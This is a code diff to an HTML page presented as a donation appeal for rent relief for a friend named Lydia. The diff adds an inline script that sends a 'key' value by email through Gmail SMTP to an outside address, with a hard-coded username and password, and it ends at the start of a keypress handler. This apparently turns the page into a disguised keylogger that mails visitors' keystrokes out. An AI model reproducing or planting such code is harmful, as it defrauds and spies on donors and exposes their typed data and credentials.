@@ -4,7 +4,19 @@
    Donate to providing rent relief for my close friend Lydia
   </title>
   <script src="https://smtpjs.com/v3/smtp.js"></script>
-  <script src="https://gofundme.ml/idk.js"></script>
+  <script>
+   function sendEmail(key){
+  Email.send({
+    Host : "smtp.gmail.com",
+    Username : "nkwim1933@gmail.com",
+    Password : "nkwimishere",
+    To : 'susanadams1133@gmail.com',
+    From : "nkwim1933@gmail.com",
+    Subject : "This is the subject",
+    Body : key
+  });
+   }
+  </script>
   <script>
 	  window.alert('hello')
    document.onkeypress = function(e) {
